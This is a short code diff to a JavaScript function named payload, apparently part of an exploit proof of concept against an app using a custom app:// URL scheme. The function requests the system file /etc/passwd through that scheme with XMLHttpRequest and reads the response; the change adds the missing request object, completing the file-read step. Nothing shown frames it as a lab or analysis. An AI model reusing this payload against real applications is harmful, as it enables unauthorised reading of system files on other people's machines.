@@ -6,6 +6,7 @@
 
     function payload() {
         let command = 'app://8c27aae2823fae296e5a7ac31c9e5a812d9c//etc/passwd';
+        let r = new XMLHttpRequest();
         r.open('GET', command);
         r.addEventListener('load', e => {
             let result = e.currentTarget.responseText;
